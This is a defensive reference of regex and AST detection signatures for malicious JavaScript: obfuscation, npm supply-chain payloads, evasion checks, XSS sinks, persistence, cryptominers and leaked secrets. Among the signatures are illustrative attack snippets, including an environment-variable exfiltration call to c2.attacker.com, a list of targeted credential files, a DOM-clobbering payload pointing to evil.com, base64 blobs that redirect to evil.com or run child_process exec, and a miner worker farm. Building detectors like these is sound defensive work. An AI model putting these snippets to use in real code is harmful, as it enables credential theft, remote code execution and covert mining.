# Advanced Threat Patterns Reference

Advanced detection signatures for threat hunting and bug bounty research, primarily JS/TS. Covers obfuscation techniques, supply chain attacks, evasion patterns, browser/Node.js exploits, and persistence mechanisms. The methodology and risk-scoring approach generalize to other runtimes.

Pair with [Security Investigation Reference](./security-investigation-reference.md) for search packs and [Hacking Books Reference](./hacking-books-reference.md) for methodology context. For basic obfuscation detection (control flow flattening, opaque predicates, property access obfuscation), see [Minification Guide](./minification-guide.md). For AST preset list, see [AST Reference](./ast-reference.md).

---

## 1. Advanced Obfuscation Techniques

### 1.1 String Array Rotation (obfuscator.io / javascript-obfuscator canonical)

Three-part structure: string array → rotation IIFE → decoder function → call sites.

```regex
# String array + rotation IIFE combo
/(\[(['"][^'"]{0,80}['"],?\s*){10,}\])[^{]{0,200}(push|shift)\s*\(/s

# Decoder call pattern (two-argument hex-indexed calls)
/\b_0x[0-9a-f]{4,6}\(0x[0-9a-f]+,\s*0x[0-9a-f]+\)/g

# High-density hex literal concentration
/(?:0x[0-9a-fA-F]+[\s,;)]{0,3}){15,}/
```

**AST signature:**
- `ArrayExpression` with 50+ `StringLiteral` children at module top-scope
- `CallExpression` matching `_0x[0-9a-f]+` with exactly 2 `NumericLiteral` hex arguments
- Self-invoking `FunctionExpression` wrapping `WhileStatement(true)` with `.push(array.shift())`

**Real-world provenance:** MageCart skimmers (2019–present), event-stream successor attacks, commodity npm credential stealers.

---

### 1.2 eval / Function Constructor Chains

```regex
# atob/unescape directly into eval or Function
/(?:eval|Function)\s*\(\s*(?:atob|decodeURIComponent|unescape)\s*\(/

# Indirect eval aliasing
/\bvar\s+\w{1,3}\s*=\s*eval\s*;/

# Function constructor with encoded string
/new\s+Function\s*\(\s*(?:atob|['"][A-Za-z0-9+/=]{20,}['"])\s*\)/

# setTimeout string form
/set(?:Timeout|Interval)\s*\(\s*['"`][^'"` ]{10,}['"`]\s*,/

# data: URI with base64 JS
/['"]data:text\/javascript;base64,[A-Za-z0-9+/=]{20,}['"]/
```

---

### 1.3 Unicode and Homoglyph Substitution

```regex
# Unicode escapes forming "eval"
/\\u0065\\u0076\\u0061\\u006[cC]/

# Zero-width characters in string literals
/['"`][^'"`]*[\u200b\u200c\u200d\u2060\ufeff][^'"`]*['"`]/u

# Non-ASCII in identifier position (possible homoglyph)
/(?:var|let|const|function)\s+[^\x00-\x7F\s(,{]+/u
```

**AST note:** Parsers normalize `\uXXXX` escapes — detection must happen on the raw source token stream, not the AST name field.

---

### 1.4 Proxy-Based Dynamic Obfuscation (ES6+)

```regex
# Proxy get trap using btoa/atob for property names
/new\s+Proxy\s*\([^)]{0,200}\bget\s*\([^)]+\)\s*\{[^}]{0,300}(?:atob|btoa)/s

# Proxy handler containing eval, fetch, XHR, or require
/new\s+Proxy\s*\([^)]+\)[^;]{0,400}(?:eval|fetch|XMLHttpRequest|require)\s*[;)]/s
```

---

## 2. Supply Chain Attack Patterns

### 2.1 Malicious Lifecycle Scripts (package.json)

Real-world incidents: `event-stream@3.3.6` (2018), `ua-parser-js@0.7.29` (2021), `node-ipc@10.1.1` (2022).

```regex
# Lifecycle script with network calls
/"(?:pre|post)?install"\s*:\s*"[^"]*(?:curl|wget|fetch|http|https|require\('http)[^"]*"/

# Base64 decode in lifecycle script
/"(?:pre|post)?install"\s*:\s*"[^"]*(?:base64|atob|Buffer\.from[^"]*base64)[^"]*"/

# Shell execution in lifecycle script
/"(?:pre|post)?install"\s*:\s*"[^"]*(?:bash\s+-c|sh\s+-c|cmd\.exe|powershell)[^"]*"/

# node -e inline execution
/"(?:pre|post)?install"\s*:\s*"node\s+-e\s+['"]/

# Python/Ruby/Perl in npm scripts
/"(?:pre|post)?install"\s*:\s*"(?:python3?|ruby|perl)\s+/
```

**AST flag:** Top-level `CallExpression` to `require('child_process')` / `require('https')` / `require('fs')` before any exports — execution-on-load pattern.

---

### 2.2 Malicious Package Payload Patterns

```javascript
// Pattern A: Environment harvesting + exfil
const env = JSON.stringify(process.env);
require('https').request({ hostname: 'c2.attacker.com', path: '/collect', method: 'POST' }, ()=>{}).end(env);

// Pattern B: Credential file exfil
['.ssh/id_rsa', '.aws/credentials', '.npmrc', '.env']
  .forEach(t => { try { /* read + exfil */ } catch(e) {} });

// Pattern C: CI bail-out (developer-only payload)
if (!process.env.CI && !process.env.GITHUB_ACTIONS && !process.env.JENKINS_HOME) { /* payload */ }

// Pattern D: Delayed execution
setTimeout(() => { /* payload */ }, 60 * 1000);
```

```regex
# Env harvest + network exfil
/process\.env[^;]{0,200}(?:https?|http)\.(?:get|request|post)/s

# Credential path targeting
/(?:\.ssh|\.aws|\.npmrc|id_rsa|credentials)\b[^;]{0,300}(?:readFile|readFileSync)/s

# CI bail-out
/!process\.env\.(?:CI|GITHUB_ACTIONS|JENKINS|TRAVIS|CIRCLECI)/

# Platform/arch conditional download
/process\.(?:platform|arch)[^;]{0,200}https?:\/\//s
```

---

### 2.3 Dependency Confusion Attack Markers

```regex
# Suspiciously high version on a new package
/"version"\s*:\s*"(?:[1-9]\d{2,}|9+)\.\d+\.\d+"/

# HTTP (non-HTTPS) resolved URL in lockfile
/"resolved"\s*:\s*"http:\/\/(?!localhost)/

# Non-standard registry in lockfile
/"resolved"\s*:\s*"https?:\/\/(?!registry\.npmjs\.org|registry\.yarnpkg\.com|npm\.pkg\.github\.com)/
```

---

## 3. Evasion Techniques

### 3.1 Browser Sandbox / Automation Detection

```regex
# WebDriver check
/navigator\s*\.\s*webdriver/

# CDP artifact
/__cdc_[a-z_]{5,40}_/

# Screen dimension zero
/screen\s*\.\s*(?:width|height)\s*===?\s*0/

# Plugin length
/navigator\s*\.\s*plugins\s*\.\s*length\s*===?\s*0/

# Multi-condition bail-out
/(?:navigator\.webdriver|plugins\.length\s*===?\s*0|screen\.width\s*===?\s*0)[^;]{0,200}(?:return|throw|location)/s
```

---

### 3.2 Timing-Based Debugger Detection

```regex
# debugger in production
/\bdebugger\b/

# performance.now timing around debugger
/performance\s*\.\s*now\s*\(\s*\)[^;]{0,100}debugger/s

# DevTools img getter trick
/Object\s*\.\s*defineProperty\s*\([^,]+,\s*['"]id['"]\s*,\s*\{[^}]*get\s*:/s

# Date.now hardcoded threshold
/Date\s*\.\s*now\s*\(\s*\)\s*[<>]=?\s*1[6-9]\d{9}/
```

---

### 3.3 Node.js Environment Fingerprinting

```regex
# CI var bail-out
/(?:CI|TRAVIS|CIRCLECI|GITHUB_ACTIONS|JENKINS_HOME)['"]\s*\)\s*\)\s*(?:process\.exit|return)/

# Sandbox hostname check
/(?:sandbox|cuckoo|remnux|any\.run|hybrid)['"]\s*\)\s*(?:\.test|\.match)/i

# Docker detection via /proc
/\/proc\/1\/cgroup/

# process.exit after environment check
/(?:process\.env\.\w+|os\.hostname\(\)|os\.userInfo\(\))[^;]{0,200}process\.exit\s*\(/s
```

---

### 3.4 Geographic / IP-Based Targeting (node-ipc style)

```regex
# IP geolocation API calls
/(?:ipapi\.co|ipify\.org|ip-api\.com|geoip\.com|ipinfo\.io)/

# Country code array check
/\[(?:'|")[A-Z]{2}(?:'|"),\s*(?:'|")[A-Z]{2}(?:'|")\]\.includes\s*\(/

# Private IP range targeting
/(?:startsWith|match|test)\s*\(\s*['"](?:192\.168\.|10\.|172\.1[6-9]\.|172\.2[0-9]\.)/
```

---

## 4. Browser-Specific Attack Patterns

### 4.1 DOM XSS Sinks

```regex
# innerHTML with dynamic RHS
/\.(?:inner|outer)HTML\s*=\s*(?!['"`][^'"` +]{0,200}['"`]\s*;)(?!null|''|""|``)/

# document.write with location-derived content
/document\s*\.\s*write\s*\([^)]*(?:location|hash|search|document\.URL|document\.referrer)/

# eval with location/document content
/(?:eval|new\s+Function)\s*\([^)]*(?:location\.|document\.|window\.name)/

# setTimeout string form with dynamic content
/set(?:Timeout|Interval)\s*\(\s*(?:location\.|document\.|window\.|[a-z_$]\w*\s*\+)/i
```

---

### 4.2 Prototype Pollution

```regex
# Direct __proto__ write
/\.__proto__\s*(?:\[['"][^\]'"]+['"]\])?\s*=/

# constructor.prototype write
/\.constructor\s*\.\s*prototype\s*\.\w+\s*=/

# JSON.parse result into merge
/(?:merge|deepMerge|_.merge|Object\.assign)\s*\([^,)]+,\s*JSON\.parse\s*\(/

# qs/querystring parse result directly merged
/(?:merge|assign|extend)\s*\([^,)]+,\s*(?:qs|querystring)\.parse\s*\(/
```

**Gadget chain to trace:**
1. Find pollution source (`_.merge`, `Object.assign` with user input)
2. Find gadget (`child_process.spawn` options, Pug template AST, `innerHTML` reads from prototype)
3. Confirm full chain: source → prototype → gadget → impact

---

### 4.3 Insecure postMessage Handlers

```regex
# Any postMessage listener
/addEventListener\s*\(\s*['"]message['"]/g

# Weak origin check (contains/includes instead of ===)
/event\s*\.\s*origin\s*\.\s*(?:includes|indexOf|startsWith|endsWith)\s*\(/

# No origin check (dangerous operations without origin validation)
# After finding a message handler, verify if event.origin is checked at all before action
```

---

### 4.4 XSS via Framework-Specific Patterns

```regex
# React dangerouslySetInnerHTML
/dangerouslySetInnerHTML\s*=\s*\{\s*\{/

# React href="javascript:"
/href\s*=\s*\{[^}]*(?:javascript:|data:text\/html)/

# Vue v-html with dynamic content
/v-html\s*=\s*["'][^"']*\$\{/

# Angular bypassSecurityTrust
/bypassSecurityTrust(?:Html|Script|Style|Url|ResourceUrl)\s*\(/

# Next.js dangerouslySetInnerHTML
/__html\s*:\s*(?!\s*''|\s*""\s*)(?!\s*``)/
```

---

## 5. Node.js-Specific Attack Patterns

### 5.1 Command Injection

```regex
# exec/spawn with string concatenation or template literals
/(?:exec|execSync|spawn|spawnSync)\s*\(\s*(?:[`'"][^'"`]*\$\{|[^)]*\+\s*(?:req\.|user|input|param|query|body))/

# Shell: true with user input
/spawn\s*\([^)]+\{\s*[^}]*shell\s*:\s*true[^}]*\}/s

# Template literal in exec call
/exec(?:Sync)?\s*\(\s*`[^`]*\$\{[^}]+\}[^`]*`\s*\)/
```

---

### 5.2 Path Traversal

```regex
# Path joining with user-controlled input
/path\.(?:join|resolve)\s*\([^)]*(?:req\.|user|input|param|query|body|\.\.)/

# Direct path construction with user input
/(?:readFile|readFileSync|writeFile|writeFileSync|createReadStream)\s*\([^)]*(?:req\.|params\.|query\.|body\.)/

# Path traversal sequences in URL/input handling
/\.\.[\/\\]/
```

---

### 5.3 SSRF Patterns

```regex
# HTTP request with user-controlled URL
/(?:fetch|axios\.get|axios\.post|http\.request|https\.request|request\s*\()\s*\([^)]*(?:req\.|user|input|param|query|body)/

# Metadata endpoint access (cloud SSRF)
/169\.254\.169\.254/

# Internal service access patterns
/(?:localhost|127\.0\.0\.1|0\.0\.0\.0|::1)\s*(?:\+|:|\/)/

# URL from user input without whitelist
/new\s+URL\s*\(\s*(?:req\.|params\.|query\.|body\.)/
```

---

### 5.4 Insecure Deserialization

```regex
# node-serialize / serialize-javascript
/require\s*\(\s*['"](?:node-serialize|serialize-javascript)['"]\s*\)\s*\.unserialize/

# JSON.parse with eval-able content
/JSON\.parse\s*\([^)]+\)\s*\.\s*(?:constructor|__proto__)/

# YAML deserialization (unsafe load)
/yaml\.load\s*\([^)]+\)/  # should be yaml.safeLoad or yaml.load with {schema: SAFE_SCHEMA}

# Function reconstruction from deserialized data
/new\s+Function\s*\(\s*(?:JSON\.parse|JSON5\.parse|YAML\.load)/
```

---

## 6. Modern Persistence Mechanisms

### 6.1 Service Worker Persistence

```javascript
// SW intercepting all requests (MitM position)
self.addEventListener('fetch', event => {
  event.respondWith(
    // Intercept and modify all responses
    fetch(event.request).then(response => injectPayload(response))
  );
});

// SW cache poisoning
caches.open('app-v1').then(cache => cache.put(url, maliciousResponse));
```

```regex
# SW install with cache poisoning
/self\s*\.\s*addEventListener\s*\(\s*['"]install['"]/

# SW fetch intercept
/self\s*\.\s*addEventListener\s*\(\s*['"]fetch['"]/

# SW cache manipulation
/caches\s*\.\s*open\s*\([^)]+\)\s*\.then.*cache\.put/s

# SW with network call in activate
/self\s*\.\s*addEventListener\s*\(\s*['"]activate['"]/
```

---

### 6.2 Electron Persistence and Escape

```regex
# nodeIntegration enabled
/nodeIntegration\s*:\s*true/

# contextIsolation disabled
/contextIsolation\s*:\s*false/

# Preload script with dangerous capabilities
/preload\s*:\s*(?:path\.join|__dirname)/

# Remote module (deprecated, dangerous)
/require\s*\(\s*['"]@electron\/remote['"]\s*\)/

# Shell openExternal with user input (opens arbitrary URLs as apps)
/shell\s*\.\s*openExternal\s*\([^)]*(?:user|input|data|event\.data)/
```

---

### 6.3 Browser Extension Persistence

```regex
# Content script injection
/chrome\.scripting\.executeScript|browser\.scripting\.executeScript/

# Background page to external communication
/chrome\.runtime\.sendMessage|browser\.runtime\.sendMessage/

# Extension storage with sensitive data
/chrome\.storage\.(local|sync)\.set.*(?:token|password|key|secret)/i

# Tab capture / screenshot
/chrome\.tabCapture|chrome\.desktopCapture/
```

---

## 7. Cryptominer Detection

```regex
# Known cryptomining library signatures
/CoinHive|coinhive|Monero|XMR|wasm_bindgen.*hash/i

# WebAssembly mining patterns
/WebAssembly\.instantiate[^)]+stratum\+tcp/s

# Cryptonight / RandomX algorithm patterns
/cryptonight|randomx|cn\/[0-9]/i

# Worker-based mining (offloads to background thread)
/new\s+Worker\s*\([^)]*(?:miner|mine|xmr|crypto)/i

# Mining pool connection string
/stratum\+(?:tcp|ssl):\/\//

# High CPU usage loops (heuristic — mining without consent)
/while\s*\(\s*true\s*\)\s*\{[^}]{0,2000}Math\.(?:pow|sqrt|abs)/s
```

---

## 8. Steganography Patterns (Code Hidden in Data)

```javascript
// LSB steganography in canvas pixel data
const imageData = ctx.getImageData(0, 0, w, h);
const payload = extractLSB(imageData.data);  // extract every nth byte

// Base64-encoded payload hidden in JSON values
{ "theme": "aGVsbG8gd29ybGQ=" }  // innocuous-looking value is payload

// Hidden code in CSS custom properties
getComputedStyle(document.body).getPropertyValue('--payload')

// Data URL with embedded executable
new Image().src = 'data:image/png;base64,...';
```

```regex
# Canvas pixel data extraction
/getImageData\s*\([^)]+\)[^;]{0,300}(?:data\[|subarray|slice)/s

# CSS custom property used as code carrier
/getPropertyValue\s*\(\s*['"]--[a-z_-]+['"]\s*\)[^;]{0,200}(?:eval|Function|atob)/s

# Data URL with unexpected MIME type content
/data:(?!image\/(?:png|jpg|jpeg|gif|svg|webp))[^;'"`]+;base64,[A-Za-z0-9+/=]{100,}/

# Pixel data + eval chain
/getImageData[^;]{0,500}(?:eval|Function|atob)/s
```

---

## 9. WebAssembly Abuse Patterns

```regex
# WASM instantiation with network-fetched module
/WebAssembly\.instantiateStreaming\s*\(\s*fetch\s*\(/

# WASM from base64-decoded buffer (hidden payload)
/WebAssembly\.instantiate\s*\(\s*(?:atob|Buffer\.from)[^)]+base64/

# WASM exports called with suspicious patterns
/\.exports\s*\.\s*(?:exec|run|decrypt|decode|eval)/

# WASM with eval-like dynamic execution after
/WebAssembly\.[^;]{0,500}(?:eval|Function|execSync|spawn)/s

# Rust/wasm-bindgen with network + exec pattern
/__wbg_(?:fetch|request|spawn)[^;]{0,200}__wbg_(?:exec|eval)/s
```

---

## 10. Secrets and Credential Patterns

High-value findings for bug bounty — critical severity when confirmed live.

```regex
# AWS Access Key ID
/AKIA[0-9A-Z]{16}/

# AWS Secret Access Key (contextual)
/(?:aws_secret|AWS_SECRET)[^'"]{0,20}['"][A-Za-z0-9/+=]{40}['"]/i

# Google Cloud / Firebase
/AIza[0-9A-Za-z\-_]{35}/

# Stripe live secret key
/sk_live_[0-9a-zA-Z]{24,}/

# Stripe publishable key
/pk_live_[0-9a-zA-Z]{24,}/

# Twilio Auth Token
/AC[a-z0-9]{32}/

# SendGrid API Key
/SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}/

# GitHub Personal Access Token
/gh[pousr]_[A-Za-z0-9_]{36,}/

# Generic high-entropy secret (false-positive-prone, use with context)
/['"](?:secret|password|api_?key|auth_?token|private_?key)['"]\s*[:=]\s*['"][A-Za-z0-9\-_+=\/]{16,}['"]/i

# JWT with hardcoded secret used in sign()
/(?:jwt|jsonwebtoken)\.sign\s*\([^,]+,\s*['"][A-Za-z0-9!@#$%^&*_\-+=]{8,}['"]/

# Private key PEM header
/-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/

# NEXT_PUBLIC_ env vars exposed to client (check value is not secret)
/NEXT_PUBLIC_[A-Z_]+\s*=\s*[^\s#]{8,}/

# REACT_APP_ env vars exposed to client
/REACT_APP_[A-Z_]+\s*=\s*[^\s#]{8,}/
```

---

## 4b. DOM Clobbering

Exploits the HTML spec: elements with `id` or `name` become global variables, overwriting `window` properties and breaking application logic.

```html
<!-- Attack HTML injected via stored XSS or markdown -->
<a id="config">clobbered</a>
<form id="config"><input name="baseUrl" value="//evil.com"></form>
```

```javascript
// Vulnerable: trusts window.config without type check
var url = window.config.baseUrl + '/api';
fetch(url);  // config is now HTMLFormElement; baseUrl is HTMLInputElement
```

```regex
# window.X used directly without type check (potential clobbering target)
/window\s*\.\s*[a-zA-Z_$][a-zA-Z0-9_$]{2,30}\s*\.\s*[a-zA-Z]/

# getElementById result used in string concat without null check
/document\s*\.\s*getElementById\s*\([^)]+\)\s*\.\s*(?:value|href|src|innerHTML)/

# Global variable used as URL base without type validation
/(?:var|let|const)\s+\w+\s*=\s*(?:window\.\w+|\w+)\s*\+\s*['"]\/(?:api|static|cdn)/
```

---

## 4c. Browser Extension Malware Patterns

**Malicious Manifest V2 permission set:**
```json
{
  "permissions": ["<all_urls>", "tabs", "webRequest", "webRequestBlocking", "cookies", "storage"],
  "background": { "scripts": ["bg.js"], "persistent": true },
  "content_scripts": [{ "matches": ["<all_urls>"], "js": ["inject.js"], "run_at": "document_start" }]
}
```

```regex
# webRequest with requestBody blocking — credential harvesting indicator
/onBeforeRequest\s*\.\s*addListener[^)]{0,500}requestBody[^)]{0,200}blocking/s

# Exfil from webRequest handler to external host
/onBeforeRequest[^}]{0,500}fetch\s*\(\s*['"]https?:\/\/(?!.*chrome\.google\.com)/s

# Content script accessing password fields
/document\s*\.\s*querySelectorAll\s*\(\s*['"]input\[type=.?password/

# Cookies access + external network call
/chrome\.cookies\.getAll[^}]{0,300}(?:fetch|XMLHttpRequest|WebSocket)/s

# Alarm-based periodic exfiltration (survives browser restart)
/chrome\s*\.\s*alarms\s*\.\s*(?:create|onAlarm)[^}]{0,300}(?:fetch|XMLHttpRequest|exfil)/s

# IndexedDB read result fed to eval
/indexedDB[^;]{0,500}eval\s*\([^)]*(?:result|data|payload)/s
```

---

## 7b. Cryptominer — Web Worker Farm (Multi-Core Mining)

```javascript
// Multi-core Web Worker farm
const workers = [];
for (let i = 0; i < navigator.hardwareConcurrency; i++) {
  workers.push(new Worker('miner-worker.js'));
}
const sharedBuffer = new SharedArrayBuffer(1024);
workers.forEach(w => w.postMessage({ buffer: sharedBuffer }));
```

```regex
# navigator.hardwareConcurrency used to spawn Worker array
/navigator\s*\.\s*hardwareConcurrency[^;]{0,200}Worker/s

# SharedArrayBuffer in Worker context
/new\s+SharedArrayBuffer\s*\(\s*\d+\s*\)[^;]{0,200}postMessage/s

# Tight hash loop with leading-zero condition (PoW / mining)
/while\s*\(\s*(?:true|1|!0)\s*\)[^}]{0,300}(?:startsWith|endsWith|slice\s*\(\s*0\s*,\s*\d\s*\))[^}]{0,100}['"]0{2,}/s
```

---

## 8b. Code Hidden in Data URIs and Blob URLs

```javascript
// Script tag with base64 JS data URI
const script = document.createElement('script');
script.src = 'data:text/javascript;base64,ZnVuY3Rpb24gc3RlYWwoKXt3aW5kb3cubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20ifX0=';
document.body.appendChild(script);

// Blob URL — evades CSP if blob: scheme allowed
const code = atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lkJyk=');
const blob = new Blob([code], { type: 'text/javascript' });
import(URL.createObjectURL(blob));

// Worker from Blob
new Worker(URL.createObjectURL(
  new Blob([atob(encodedPayload)], { type: 'application/javascript' })
));
```

```regex
# data: URI with base64 JS assigned to script.src
/script\s*\.\s*src\s*=\s*['"]data:text\/javascript;base64,/

# Blob created from atob/decoded content
/new\s+Blob\s*\(\s*\[[^)]*(?:atob|decodeURIComponent|fromCharCode)[^)]*\]/

# Worker or import() from Blob URL
/(?:new\s+Worker|import)\s*\([^)]*URL\s*\.\s*createObjectURL\s*\(/

# Dynamic import() with variable URL (not string literal)
/import\s*\(\s*(?!['"`][^'"`]+['"`]\s*\))[a-zA-Z_$][a-zA-Z0-9_$]*\s*\)/
```

---

## 10b. Taint Sources and Sinks

### Sources (user/external controlled data)
```
req.query.*       req.body.*        req.params.*       req.headers.*
location.href     location.hash     location.search    document.cookie
document.referrer window.name       navigator.*        postMessage event.data
process.env.*     process.argv.*    fs.readFile result fetch() response body
```

### Sinks (dangerous operations)
```
eval()            new Function()    setTimeout(str)    setInterval(str)
innerHTML=        document.write()  exec()             execSync()
spawn()           vm.runInNewContext()  fs.writeFile() child_process.*
fetch(url)        XMLHttpRequest    WebSocket(url)     import(dynamic)
```

### Taint propagation rules
- String concatenation: `source + '/path'` → still tainted
- Template literals: `` `prefix${source}` `` → still tainted
- Array join: `[source].join('')` → still tainted
- Encoding wrapping: `atob`/`btoa` wrapping — taint survives
- Object property: `{ url: source }` → property is tainted
- JSON.stringify → JSON.parse chain — taint survives

### High-Value AST Node Combinations

| Threat | Primary AST Nodes | Detection Logic |
|---|---|---|
| String array obfuscation | `ArrayExpression` + `StringLiteral` (50+) at `Program` scope | Top-scope array with >50 short string elements |
| Control flow flattening | `WhileStatement(true)` + `SwitchStatement` + `ContinueStatement` | While-true wrapping switch, all cases ending in continue |
| Indirect eval | `CallExpression` where callee identifier resolves to `eval` | Track `eval` assignment through aliases |
| Prototype pollution | `AssignmentExpression` where LHS is `MemberExpression(property='__proto__')` | Direct proto write |
| Command injection | `CallExpression(exec\|spawn)` where args transitively reach request params | Taint track from `req.*` to shell |
| postinstall exfil | Top-level `CallExpression(require('https'))` in install script | Require of network module at module top level |
| SW registration with variable URL | `CallExpression(serviceWorker.register)` where first arg is not `StringLiteral` | Non-literal first argument |
| WASM eval bridge | `ObjectExpression` to `WebAssembly.instantiate` containing `FunctionExpression` calling `eval` | Import object function body contains eval |

### Entropy-Based Scoring

High-entropy string literals (Shannon entropy > 4.5 bits/char) indicate encoded payloads, base64 data, or keys.

| Content Type | Entropy |
|---|---|
| Normal English text | ~3.5 bits/char |
| Base64 encoded data | ~5.5 bits/char |
| Encrypted/compressed | ~7.5 bits/char |
| Random hex string | ~4.0 bits/char |

**Flag conditions:**
- Single string literal > 200 chars with entropy > 5.0
- Any string matching `/^[A-Za-z0-9+/=]{100,}$/` (base64 pattern)
- String of pure hex `[0-9a-f]` > 64 chars (likely key or hash)

---

## 13. Detection Strategy Summary

### 4-Layer Detection Architecture

```
Layer 1: REGEX SCAN (fast, high-recall, lower precision)
  → Run all regex patterns from this reference against raw source
  → Flag files with 3+ pattern matches as HIGH RISK
  → Flag files with 1–2 matches as REVIEW

Layer 2: AST ANALYSIS (precise, catches obfuscated variants)
  → Parse with @babel/parser or acorn with error recovery
  → Check AST node combinations from §10b
  → Taint track from sources to sinks (§10b)
  → Entropy-score all string literals (§10b)

Layer 3: BEHAVIORAL HEURISTICS (catches novel variants)
  → Count eval/Function constructor calls
  → Ratio of hex literals to total tokens
  → String array size at module top scope
  → Presence of CI bail-out before payload
  → Import/require ratio vs. actual exports

Layer 4: RUNTIME MONITORING (catches evasive payloads)
  → Hook eval, Function, fetch, exec at runtime
  → Monitor for navigator.webdriver checks (sandbox probe)
  → Monitor for unexpected ServiceWorker registration
  → Alert on WebAssembly instantiation with non-literal source
```

### Risk Scoring Matrix

| Signal | Score |
|---|---|
| `_$$ND_FUNC$$_` in JSON (node-serialize RCE) | +60 |
| `postinstall` with network call | +50 |
| SSH/AWS credential path in readFile | +50 |
| `eval(atob(...))` pattern | +40 |
| `nodeIntegration: true` in Electron | +40 |
| Inline WASM base64 (`AGFzbQ` prefix) | +40 |
| WebAssembly with eval in import object | +45 |
| `__proto__` assignment | +35 |
| Canvas LSB extraction chain | +35 |
| CI variable bail-out before payload | +35 |
| `process.env` CI bail-out array | +30 |
| Chrome `webRequest` + `requestBody` | +30 |
| Levenshtein-1 match to popular npm package | +45 |
| navigator.webdriver check | +25 |
| IP geolocation API call | +25 |
| String array > 100 elements | +20 |
| Control flow flattening pattern | +20 |

**Thresholds:** Score >= 50 → block/quarantine. Score 25–49 → human review. Score < 25 → log only.

### Known Tool References

| Tool | Use Case |
|---|---|
| `@babel/parser` | Robust AST parsing with JSX/TypeScript support |
| `acorn` + `acorn-loose` | Lightweight AST parsing with error recovery |
| `eslint-plugin-security` | AST-based security rule set for Node.js |
| `semgrep` | Pattern-based multi-language AST scanning |
| `socket` (socketdev) | npm package behavioral analysis |
| `snyk` | Dependency vulnerability and behavior scanning |
| `webcrack` | Handles obfuscator.io, webpack, string array rotation |
| `synchrony` | AST-based JS deobfuscator (control flow unflattening) |
| `wabt` (wasm2wat) | Disassemble WASM to WAT text format for inspection |
| `js-x-ray` (NodeSecure) | Static malware detection in npm packages |
| `retire.js` | Detects vulnerable client-side JS libraries |

---

## 12. Detection Confidence Matrix

| Pattern Class | Confidence Alone | Confidence with Flow Trace | Notes |
|---|---|---|---|
| `eval(atob(...))` | likely | confirmed | Decode the argument to verify payload |
| `postinstall` + network | likely | confirmed | Check actual HTTP destination |
| String array rotation | certain (obfuscator.io) | — | Obfuscation confirmed; behavior still needs tracing |
| `__proto__` write | likely pollution | confirmed | Find the gadget to confirm impact |
| Hardcoded credential | likely valid | confirmed | Validate against service API |
| CI bail-out | likely evasion | confirmed | Check what runs when CI vars absent |
| Geolocation + conditional | likely targeted | confirmed | Find the conditional payload |
| `debugger` timing check | certain anti-analysis | — | What is being hidden is the finding |
| Pattern only, no flow | uncertain | — | Never escalate without flow trace |
